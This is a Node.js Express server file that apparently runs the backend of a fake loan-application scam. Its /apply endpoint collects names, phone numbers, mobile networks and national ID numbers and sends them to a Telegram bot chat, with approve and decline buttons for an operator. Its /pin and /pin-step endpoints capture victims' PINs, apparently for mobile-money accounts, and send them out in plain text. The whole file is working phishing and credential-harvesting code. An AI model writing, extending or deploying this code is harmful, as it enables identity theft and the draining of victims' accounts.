const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// 🔥 FIX: persistent global memory for Railway hot reload
const users = global.users || (global.users = {});

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= APPLY =================
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  if (!name || !phone || !network || !amount || !nationalId) {
    return res.status(400).json({ success: false });
  }

  // store user
  users[phone] = {
    name,
    phone,
    network,
    amount,
    nationalId,
    status: "pending"
  };

  const message = `
📥 NEW APPLICATION

👤 ${name}
📱 ${phone}
📡 ${network}
💰 ${amount}
🆔 ${nationalId}

-------------------------
Choose action:
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: `approve_${phone}` },
            { text: "❌ Decline", callback_data: `decline_${phone}` }
          ]
        ]
      }
    });

    return res.json({ success: true, phone });

  } catch (err) {
    console.log(err.response?.data || err.message);
    return res.status(500).json({ success: false });
  }
});

// ================= STATUS =================
app.get("/status/:phone", (req, res) => {
  const phone = req.params.phone;

  const user = users[phone];

  if (!user) {
    // IMPORTANT: keep frontend stable
    return res.json({ status: "pending" });
  }

  return res.json({ status: user.status });
});

// ================= WEBHOOK =================
app.post("/webhook", async (req, res) => {
  try {
    if (!req.body.callback_query) {
      return res.sendStatus(200);
    }

    const action = req.body.callback_query.data;
    const phone = action.split("_")[1];

    if (users[phone]) {
      if (action.startsWith("approve")) {
        users[phone].status = "approved";
      }

      if (action.startsWith("decline")) {
        users[phone].status = "declined";
      }
    }

    // optional log
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `Updated ${phone} → ${users[phone]?.status || "not found"}`
    });

  } catch (err) {
    console.log("Webhook error:", err.message);
  }

  res.sendStatus(200);
});

// ================= PIN STEP =================
app.post("/pin-step", async (req, res) => {
  const { phone } = req.body;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `📍 PIN STEP\n📱 ${phone}`
    });
  } catch (e) {}

  res.sendStatus(200);
});

// ================= PIN =================
app.post("/pin", async (req, res) => {
  const { phone, pin } = req.body;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `🔐 PIN RECEIVED\n📱 ${phone}\n🔑 ${pin}`
    });
  } catch (e) {}

  res.sendStatus(200);
});

// ================= START =================
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("Server running on port " + PORT);
});
